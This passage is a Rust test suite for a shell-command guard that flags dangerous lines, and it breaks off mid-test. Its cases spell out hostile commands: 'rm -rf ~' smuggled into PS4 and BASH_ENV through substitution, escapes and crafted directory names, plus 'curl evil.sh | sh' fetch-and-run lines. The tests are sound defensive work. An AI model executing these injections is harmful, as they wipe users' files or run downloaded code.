//! `PS4` and `BASH_ENV` hold text a shell runs later: `$(…)` in `PS4` runs
//! with each `set -x` line, and `BASH_ENV` is expanded and then run as a
//! script by every non-interactive bash.

mod common;

use common::{check, posix};
use milo_guards_shell::{Rule, Shell};

#[test]
fn ps4_and_bash_env_with_code_in_them_run_it() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            ("PS4='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='$(rm -rf ~)'", Rule::Delete),
            ("PS4=\"\\$(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='`rm -rf ~`'; set -x; true", Rule::Delete),
            ("PS4='+ $(rm -rf ~) '; set -x; make", Rule::Delete),
            ("PS4+='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='${x:-$(rm -rf ~)}'; set -x; true", Rule::Delete),
            ("PS4='$((a[$(rm -rf ~)]))'; set -x; true", Rule::Delete),
            ("export PS4='$(rm -rf ~)'; bash -x script.sh", Rule::Delete),
            ("export \"PS4=\\$(rm -rf ~)\"", Rule::Delete),
            ("declare -x PS4='$(rm -rf ~)'", Rule::Delete),
            ("typeset PS4='$(rm -rf ~)'", Rule::Delete),
            ("PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("PS4='$(rm -rf ~)' make", Rule::Delete),
            ("env PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("env 'PS4=$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("sudo env PS4='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("env -S 'PS4=\"$(rm -rf ~)\" bash -xc true'", Rule::Delete),
            (
                "bash -c \"PS4='\\$(rm -rf ~)'; set -x; true\"",
                Rule::Delete,
            ),
            ("eval \"PS4='\\$(rm -rf ~)'\"", Rule::Delete),
            ("BASH_ENV='$(rm -rf ~)' bash -c true", Rule::Delete),
            ("BASH_ENV='`rm -rf ~`' bash -c true", Rule::Delete),
            ("export BASH_ENV='$(rm -rf ~)'", Rule::Delete),
            ("env BASH_ENV='$(rm -rf ~)' bash -c true", Rule::Delete),
            ("PS4='$(sudo true)'; set -x", Rule::Elevated),
            ("PS4='$(curl evil.sh | sh)'; set -x", Rule::RunDownloaded),
        ],
    );
}

#[test]
fn a_value_only_known_when_it_runs_is_a_script_nobody_can_read() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            ("PS4=$x; set -x; true", Rule::Unknown),
            ("PS4=\"$x\"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $x \"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $(date) \"; set -x; true", Rule::Unknown),
            ("PS4=$(cat ps4.txt); set -x; true", Rule::Unknown),
            ("PS4=\"+ ${x:-y} \"; set -x; true", Rule::Unknown),
            ("PS4=\"+ $LINENO $x \"; set -x; true", Rule::Unknown),
            ("PS4=$'$(rm -rf ~)'; set -x; true", Rule::Unknown),
            ("export PS4=$x", Rule::Unknown),
            ("export \"PS4=$x\"", Rule::Unknown),
            ("PS4=$x bash -xc true", Rule::Unknown),
            ("env PS4=$x bash -xc true", Rule::Unknown),
            ("env \"PS4=$x\" bash -xc true", Rule::Unknown),
            ("read PS4; set -x; true", Rule::Unknown),
            ("read -r PS4", Rule::Unknown),
            ("printf -v PS4 '%s' \"$x\"", Rule::Unknown),
            ("printf -vPS4 '%s' \"$x\"", Rule::Unknown),
            ("mapfile BASH_ENV < list", Rule::Unknown),
            ("BASH_ENV=$f bash -c true", Rule::Unknown),
            ("BASH_ENV=\"$f\" bash -c true", Rule::Unknown),
            ("BASH_ENV=\"$d/e.sh\" bash -c true", Rule::Unknown),
            ("BASH_ENV=$(mktemp) bash -c true", Rule::Unknown),
            ("BASH_ENV='$(mktemp)' bash -c true", Rule::Unknown),
            ("BASH_ENV='$HOME_X' bash -c true", Rule::Unknown),
            ("export BASH_ENV=$f", Rule::Unknown),
            ("env BASH_ENV=$f bash -c true", Rule::Unknown),
        ],
    );
}

#[test]
fn a_bash_env_file_the_line_writes_is_a_script_it_runs() {
    check(
        Shell::Posix,
        &posix(),
        &[],
        &[
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh && BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=./e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash script.sh",
                Rule::Unknown,
            ),
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh bash", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh zsh -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh sh -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh sudo bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh nohup bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; env BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; env 'BASH_ENV=e.sh' bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export \"BASH_ENV=e.sh\"; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > /tmp/e.sh; BASH_ENV=/tmp/e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "cat > e.sh <<'EOF'\nrm -rf ~\nEOF\nBASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "printf 'rm -rf ~' | tee e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "curl -o e.sh https://example.org/e.sh; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; cd \"$d\"; BASH_ENV=e.sh bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn an_ordinary_ps4_or_bash_env_stays_safe() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ '; set -x; make",
            "PS4='+ '",
            "PS4=\"+ \"",
            "PS4=+; set -x; make",
            "PS4=; set -x; make",
            "PS4=''",
            "PS4='+ ${BASH_SOURCE}:${LINENO}: '; set -x; make",
            "PS4='+ $LINENO: '; set -x; make",
            "PS4=\"+ $LINENO: \"; set -x; make",
            "PS4=\"+ ${BASH_SOURCE}:${LINENO}:${FUNCNAME[0]}: \"",
            "PS4=\"+ $SECONDS $RANDOM $$ \"",
            "export PS4='+ '",
            "export PS4",
            "export PS4=\"+ $LINENO \"",
            "declare -x PS4='+ '",
            "PS4='+ ' bash -x script.sh",
            "env PS4='+ ' make",
            "env 'PS4=+ ' make",
            "PS4='+ $(date +%T) '; set -x; make",
            "PS4='\\033[1m+ '; set -x; make",
            "PS4='+ \\u@\\h: '; set -x; make",
            "PS4='+ ${x}'; set -x; make",
            "PS4='+ '; set +x; make",
            "echo $PS4",
            "echo 'PS4=$(rm -rf ~)'",
            "echo \"PS4=\\$(rm -rf ~)\"",
            "grep PS4 ~/.bashrc",
            "unset PS4",
            "read -r line",
            "printf -v out '%s' hi",
            "printf '%s\\n' PS4",
            "mapfile lines < list.txt",
            "BASH_ENV=",
            "BASH_ENV=e.sh bash -c true",
            "BASH_ENV=e.sh bash script.sh",
            "BASH_ENV=~/.bashenv bash -c true",
            "BASH_ENV=\"$HOME/.bashenv\" bash -c true",
            "export BASH_ENV=~/.bashenv",
            "env BASH_ENV=e.sh bash -c true",
            "echo 'echo hi' > other.sh; BASH_ENV=e.sh bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV= bash -c true",
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
            "echo 'echo hi' > e.sh; echo BASH_ENV=e.sh",
            "bash -c 'echo hi'",
        ],
        &[],
    );
}

/// `count` words, `before`, a number, `after`.
fn names(before: &str, after: &str, count: usize) -> String {
    use std::fmt::Write;
    (0..count).fold(String::new(), |mut line, at| {
        let _ = write!(line, "{before}{at}{after}");
        line
    })
}

#[test]
fn octal_escapes_in_ps4_are_decoded_before_the_shell_expands_it() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='\\033[1;34m+ \\033[0m'; set -x; make",
            "PS4='\\\\044(rm -rf ~)'; set -x; true",
            "PS4='\\0440(x)'; set -x; true",
        ],
        &[
            ("PS4='\\044(rm -rf ~)'; set -x; true", Rule::Delete),
            // `\44` is the `$` as `\044` is: bash takes one to three digits.
            ("PS4='\\44(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4='\\140rm -rf ~\\140'; set -x; true", Rule::Delete),
            ("PS4=\"\\044(rm -rf ~)\"; set -x; true", Rule::Delete),
            ("PS4='+ \\044\\050rm -rf ~) '; set -x; true", Rule::Delete),
            ("PS4='\\044{ rm -rf ~; }'; set -x; true", Rule::Unreadable),
        ],
    );
}

#[test]
fn a_funsub_in_a_value_the_shell_expands_is_code() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ ${x} '; set -x; make",
            "PS4='+ ${x:-y} '; set -x; make",
            "PS4='+ ${#x} '; set -x; make",
        ],
        &[
            ("PS4='${ rm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='${| rm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='${\trm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='${\nrm -rf ~; }'; set -x; true", Rule::Unreadable),
            ("PS4='+ ${ rm -rf ~; } '; set -x; true", Rule::Unreadable),
            ("export PS4='${ rm -rf ~; }'", Rule::Unreadable),
            ("BASH_ENV='${ rm -rf ~; }' bash -c true", Rule::Unreadable),
        ],
    );
}

#[test]
fn a_subscripted_assignment_sets_the_variable() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4[1]='$(rm -rf ~)'; set -x; true",
            "PS4[12]='$(rm -rf ~)'",
            "PS4[0]='+ '; set -x; make",
            "BASH_ENV[1]=e.sh; echo x > e.sh; bash -c true",
            "echo x > e.sh; BASH_ENV[1]=e.sh bash -c true",
            "export 'PS4[1]=$(rm -rf ~)'",
        ],
        &[
            ("PS4[0]='$(rm -rf ~)'; set -x; true", Rule::Delete),
            ("PS4[00]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[i]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[$n]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[a=1]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[0]+='$(rm -rf ~)'", Rule::Delete),
            ("export PS4[0]='$(rm -rf ~)'", Rule::Delete),
            ("declare -x PS4[0]='$(rm -rf ~)'", Rule::Delete),
            ("export 'PS4[0]=$(rm -rf ~)'", Rule::Delete),
            ("export PS4+='$(rm -rf ~)'", Rule::Delete),
            ("env 'PS4[0]=$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("PS4[0]='$(rm -rf ~)' bash -xc true", Rule::Delete),
            ("read 'PS4[0]'", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[0]=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[i]=e.sh bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[0]=e.sh; export BASH_ENV; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[0]=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export 'BASH_ENV[0]=e.sh'; bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn builtin_and_command_run_the_declaration_that_follows() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "builtin export PS4='+ '; set -x; make",
            "command export PS4='+ '",
            "builtin echo PS4='$(rm -rf ~)'",
            "command -v export PS4='$(rm -rf ~)'",
            "command -V export PS4='$(rm -rf ~)'",
            "command -pv export PS4='$(rm -rf ~)'",
            "builtin export PS4",
            "echo x > e.sh; builtin export BASH_ENV=other.sh; bash -c true",
        ],
        &[
            (
                "builtin export PS4='$(rm -rf ~)'; set -x; true",
                Rule::Delete,
            ),
            (
                "command export PS4='$(rm -rf ~)'; set -x; true",
                Rule::Delete,
            ),
            ("builtin declare PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin typeset PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin local PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin readonly PS4='$(rm -rf ~)'", Rule::Delete),
            ("command -p export PS4='$(rm -rf ~)'", Rule::Delete),
            ("command -- export PS4='$(rm -rf ~)'", Rule::Delete),
            ("command builtin export PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin command declare -x PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin export -n PS4='$(rm -rf ~)'", Rule::Delete),
            ("builtin export \"PS4=\\$(rm -rf ~)\"", Rule::Delete),
            ("builtin export PS4='${ rm -rf ~; }'", Rule::Unreadable),
            ("builtin export PS4=$x", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; builtin export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; command export BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; builtin declare -x BASH_ENV=e.sh; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; builtin export BASH_ENV[0]=e.sh; bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn an_expanded_bash_env_name_is_the_file_where_it_was_assigned() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "echo x > e.sh; export BASH_ENV=e.sh; cd sub; bash -c true",
            "echo x > e.sh; cd sub; export BASH_ENV=e.sh; bash -c true",
            "echo x > e.sh; cd sub; export BASH_ENV=$PWD/e.sh; bash -c true",
            "echo x > other.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
        ],
        &[
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export BASH_ENV=\"$PWD/e.sh\"; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export BASH_ENV=${PWD}/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; BASH_ENV=$PWD/e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > e.sh; export \"BASH_ENV=$PWD/e.sh\"; cd sub; bash -c true",
                Rule::Unknown,
            ),
            (
                "echo x > sub/e.sh; export BASH_ENV=e.sh; cd sub; bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
#[allow(
    clippy::disallowed_methods,
    reason = "the guard keeps no clock; only this test times it, to catch a quadratic read"
)]
fn a_line_that_sets_bash_env_over_and_over_is_judged_within_a_bound() {
    let distinct = names("BASH_ENV=e", ";", 2500);
    let lines = [
        format!(
            "echo x>e;{}{}",
            "BASH_ENV=e;".repeat(3000),
            "bash;".repeat(6000)
        ),
        format!("{distinct}{}", "bash;".repeat(5000)),
        format!("{}{}", "BASH_ENV=e;".repeat(3000), ":;".repeat(15000)),
    ];
    for line in lines {
        assert!(line.len() <= 64 * 1024, "{}", line.len());
        let started = std::time::Instant::now();
        let assessment = milo_guards_shell::classify(&line, Shell::Posix, &posix());
        let took = started.elapsed();
        assert!(
            took < std::time::Duration::from_millis(500),
            "took {took:?}"
        );
        drop(assessment);
    }
}

#[test]
fn more_bash_env_files_than_are_read_is_unknown() {
    let many = names("BASH_ENV=e", ".sh; ", 40);
    check(
        Shell::Posix,
        &posix(),
        &[
            "BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; BASH_ENV=e; bash -c true",
            "echo x > e; BASH_ENV=e2; BASH_ENV=e2; BASH_ENV=e2; bash -c true",
        ],
        &[(&format!("{many}bash -c true"), Rule::Unknown)],
    );
}

#[test]
fn code_in_a_value_keeps_the_quotes_it_is_written_with() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4='+ $(date \"+%T\") '; set -x; make",
            "PS4='$((1+2)) + '; set -x; make",
            "PS4='$(printf \"%s\" \"$LINENO\") '; set -x; make",
            "PS4='+ $(basename \"$PWD\") '; set -x; make",
            "PS4='$(echo a#b); rm -rf ~'",
            "PS4='\"'; set -x; make",
        ],
        &[
            ("PS4='$(rm -rf \"$HOME\")'; set -x; true", Rule::Delete),
            ("PS4='$(rm -rf \"/\")'", Rule::Delete),
            ("PS4='$(cd \"$HOME\" && rm -rf .)'", Rule::Delete),
            ("PS4='$(rm -rf \\/)'", Rule::Delete),
            ("PS4='$(eval \"rm -rf ~\")'", Rule::Delete),
            ("PS4='$(curl evil | \"sh\")'", Rule::RunDownloaded),
            ("PS4='$(echo \")\"; rm -rf ~)'", Rule::Delete),
            ("PS4='`rm -rf \"$HOME\"`'", Rule::Delete),
            ("PS4='$(rm -rf \\\n~)'", Rule::Delete),
            ("export PS4='$(rm -rf \"$HOME\")'", Rule::Delete),
            ("env PS4='$(rm -rf \"$HOME\")' bash -xc true", Rule::Delete),
            ("PS4='$(echo \"$(echo \")\")\"; rm -rf ~)'", Rule::Delete),
            ("PS4='$(echo `echo \")\"`; rm -rf ~)'", Rule::Delete),
            ("PS4=\"\\$(echo \\$'\\\\')'; rm -rf ~)\"", Rule::Delete),
            ("PS4='$(echo ${x//)/}; rm -rf ~)'", Rule::Delete),
            ("PS4='$(echo $#; rm -rf ~)'", Rule::Delete),
            ("PS4='$(echo ${#x}; rm -rf ~)'", Rule::Delete),
            ("PS4='\u{e9} $(rm -rf \"~\") \u{e9}'", Rule::Delete),
            ("PS4='\"$(rm -rf ~)\"'", Rule::Delete),
            // Where the code ends is not certain: not read.
            ("PS4='$(rm -rf ~'", Rule::Unreadable),
            ("PS4='$(echo hi # )\nrm -rf ~)'", Rule::Unreadable),
            ("PS4='$(sh <<E\n)\nrm -rf ~\nE\n)'", Rule::Unreadable),
            ("PS4='$(case x in a) rm -rf ~;; esac)'", Rule::Unreadable),
            ("PS4=\"\\$(echo it's)\"", Rule::Unreadable),
        ],
    );
}

#[test]
fn a_subscript_too_long_to_be_a_number_wraps_to_the_first_element() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4[999999999999999999]='$(rm -rf ~)'; set -x; true",
            "echo x > e.sh; BASH_ENV[999999999999999999]=e.sh bash -c true",
        ],
        &[
            (
                "PS4[18446744073709551616]='$(rm -rf ~)'; set -x; true",
                Rule::Delete,
            ),
            ("PS4[1000000000000000000]='$(rm -rf ~)'", Rule::Delete),
            ("PS4[0x1]='$(rm -rf ~)'", Rule::Delete),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV[18446744073709551616]=e.sh bash -c true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn pwd_after_a_cd_is_the_name_the_line_chose() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4=\"+ $PWD \"; set -x; make",
            "PS4=\"+ $PWD $PWD \"; set -x; make",
            "cd sub; PS4=\"+ $PWD \"; set -x; make",
            "PS4=\"+ $HOME $TMPDIR \"; set -x; make",
            "PS4=\"+ $HOME $LINENO \"; set -x; make",
            "cd sub; export BASH_ENV=$PWD/e.sh; bash -c true",
        ],
        &[
            (
                "mkdir 'd$(rm -rf ~)'; cd 'd$(rm -rf ~)'; PS4=\"+ $PWD \"; set -x; true",
                Rule::Unknown,
            ),
            ("cd \"$x\"; PS4=\"+ $PWD \"; set -x; true", Rule::Unknown),
            (
                "cd \"$x\"; PS4=\"+ $PWD $PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "cd 'd`rm -rf ~`'; PS4=\"+ ${PWD} \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "cd 'd\\044(rm -rf ~)'; PS4=\"+ $PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "cd 'd$(rm -rf ~)'; BASH_ENV=\"$PWD/e.sh\" bash -c true",
                Rule::Unknown,
            ),
            // A place the line sets is a name it chose, too.
            (
                "HOME='$(rm -rf ~)'; PS4=\"+ $HOME \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "TMPDIR=x; PS4=\"$TMPDIR $LINENO\"; set -x; true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn a_bash_env_file_the_line_writes_is_run_by_anything_that_may_start_bash() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "echo 'echo hi' > e.sh; BASH_ENV=e.sh echo done",
            "echo x > e.sh; export BASH_ENV=e.sh; echo hi; pwd; true",
            "echo x > e.sh; export BASH_ENV=e.sh; cd sub; echo hi; ls",
            "echo x > other.sh; BASH_ENV=e.sh make",
            "echo x > other.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;",
        ],
        &[
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh make", Rule::Unknown),
            ("echo 'echo hi' > e.sh; BASH_ENV=e.sh make", Rule::Unknown),
            ("echo 'echo hi' > e.sh; BASH_ENV=e.sh; make", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; make test",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; npm test",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh ./build.sh",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh git commit -m x",
                Rule::Unknown,
            ),
            ("echo 'rm -rf ~' > e.sh; BASH_ENV=e.sh $cmd", Rule::Unknown),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; command make",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; (make)",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; f() { make; }; f",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -exec bash -c true \\;",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -execdir bash -c true \\;",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; find . -ok bash -c true \\;",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; npx bash -c true",
                Rule::Unknown,
            ),
            (
                "echo 'rm -rf ~' > e.sh; export BASH_ENV=e.sh; xargs make",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn pwd_is_not_plain_after_a_cd_that_lands_on_a_name_the_line_did_not_write_out() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "cd 'Foo (x86)'; PS4=\"+ $PWD \"; set -x; make",
            "cd -L sub; PS4=\"+ $PWD \"; set -x; make",
            "set -e; cd sub; PS4=\"+ $PWD \"; set -x; make",
            "set +P; cd sub; PS4=\"+ $PWD \"; set -x; make",
            "CDPATH=.:~; PS4=\"+ $PWD \"; set -x; make",
            "CDPATH=.:~; cd sub; PS4=\"+ $LINENO \"; set -x; make",
            "cd d*; PS4=\"+ $LINENO \"; set -x; make",
            "cd d*; export BASH_ENV=e.sh; bash -c true",
            "cd -P sub; PS4=\"+ $LINENO \"; set -x; make",
        ],
        &[
            // A glob matches a folder the line made but did not write out.
            (
                "mkdir 'd$(rm -rf ~)'; cd d*; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; cd d?; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; cd [d]*; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; cd 'a@(b)'; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; pushd d*; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; cd d*; cd sub; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; cd d*; export BASH_ENV=\"$PWD/e.sh\"; bash -c true",
                Rule::Unknown,
            ),
            (
                "mkdir 'd$(rm -rf ~)'; cd d*; BASH_ENV=\"$PWD/e.sh\" bash -c true",
                Rule::Unknown,
            ),
            // `-P` and `physical`: PWD is the link's target.
            (
                "ln -s 'd$(rm -rf ~)' s; cd -P s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; cd -LP s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; pushd -P s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; set -P; cd s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; set -o physical; cd s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; set -eP; cd s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; shopt -so physical; cd s; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "ln -s 'd$(rm -rf ~)' s; bash -P -c 'cd s; PS4=\"+$PWD \"; set -x; true'",
                Rule::Unknown,
            ),
            // A `CDPATH` the line sets finds a folder the line made.
            (
                "mkdir -p 'x$(rm -rf ~)/sub'; CDPATH='x$(rm -rf ~)'; cd sub; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir -p 'x/sub'; CDPATH=x; cd sub; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir -p 'x/sub'; export CDPATH=x; cd sub; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir -p 'x/sub'; export \"CDPATH=x\"; cd sub; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir -p 'x/sub'; CDPATH=x cd sub; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
            (
                "mkdir -p 'x/sub'; cd sub; CDPATH=x; PS4=\"+$PWD \"; set -x; true",
                Rule::Unknown,
            ),
        ],
    );
}

#[test]
fn a_bash_env_set_anywhere_in_the_line_reaches_every_shell_the_line_starts() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "trap 'make' EXIT; export BASH_ENV=e.sh",
            "echo x > other.sh; trap 'make' EXIT; export BASH_ENV=e.sh",
            "for i in 1 2; do bash -c true; done; export BASH_ENV=e.sh",
            "f() { make; }; export BASH_ENV=e.sh; f",
        ],
        &[
            (
                "trap 'bash -c true' EXIT; echo x > e.sh; export BASH_ENV=e.sh",
                Rule::Unknown,
            ),
            (
                "trap 'make' EXIT; echo x > e.sh; export BASH_ENV=e.sh",
                Rule::Unknown,
            ),
            (
                "for i in 1 2; do bash -c true; echo x > e.sh; export BASH_ENV=e.sh; done",
                Rule::Unknown,
            ),
            (
                "f() { make; }; f; echo x > e.sh; export BASH_ENV=e.sh",
                Rule::Unknown,
            ),
            (
                "bash -c true; echo x > e.sh; BASH_ENV=e.sh; true",
                Rule::Unknown,
            ),
            ("make; echo x > e.sh; export BASH_ENV=e.sh", Rule::Unknown),
        ],
    );
}

#[test]
fn a_value_with_pwd_in_it_is_judged_against_every_cd_of_the_line() {
    check(
        Shell::Posix,
        &posix(),
        &[
            "PS4=\"+$PWD \"; cd sub; set -x; true",
            "for d in x .; do PS4=\"+$PWD \"; cd sub; done; set -x; true",
            "f() { PS4=\"+$PWD \"; }; cd sub; f; set -x; true",
            "trap 'PS4=\"+$PWD \"; set -x; true' EXIT; cd sub",
            "cd 'x$(rm -rf ~)'; PS4=\"+$LINENO \"; set -x; true",
            "cd 'x$(rm -rf ~)'; export BASH_ENV=e.sh; echo hi",
        ],
        &[
            (
                "PS4=\"+$PWD \"; cd 'x$(rm -rf ~)'; set -x; true",
                Rule::Unknown,
            ),
            (
                "for d in x .; do PS4=\"+$PWD \"; cd 'x$(rm -rf ~)'; done; set -x; true",
                Rule::Unknown,
            ),
            (
                "f() { PS4=\"+$PWD \"; }; cd 'x$(rm -rf ~)'; f; set -x; true",
                Rule::Unknown,
            ),
            (
                "trap 'PS4=\"+$PWD \"; set -x; true' EXIT; cd 'x$(rm -rf ~)'",
                Rule::Unknown,
            ),
            (
                "PS4=\"+$PWD \"; (cd 'x$(rm -rf ~)'; true); set -x; true",
                Rule::Unknown,
            ),
            ("PS4=\"+$PWD \"; cd d*; set -x; true", Rule::Unknown),
            (
                "export BASH_ENV=\"$PWD/e.sh\"; cd 'x$(rm -rf ~)'; bash -c true",
                Rule::Unknown,
            ),
            (
